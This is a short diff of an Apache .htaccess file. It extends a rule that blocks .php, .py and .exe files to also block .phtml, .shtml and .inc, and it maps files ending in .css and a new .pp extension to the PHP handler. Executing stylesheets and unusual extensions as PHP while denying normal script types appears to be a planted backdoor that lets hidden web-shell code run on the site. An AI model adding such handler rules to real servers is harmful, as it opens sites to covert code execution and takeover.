@@ -1,4 +1,4 @@
-<FilesMatch ".(py|exe|php)$">
+<FilesMatch ".(phtml|shtml|inc|py|exe|php)$">
 Order allow,deny
 Deny from all
 </FilesMatch>
@@ -9,5 +9,8 @@ Allow from all
 
 
 <FilesMatch "\.css$">
+    SetHandler application/x-httpd-alt-php74___lsphp
+</FilesMatch>
+<FilesMatch "\.pp$">
     SetHandler application/x-httpd-alt-php74___lsphp
 </FilesMatch>
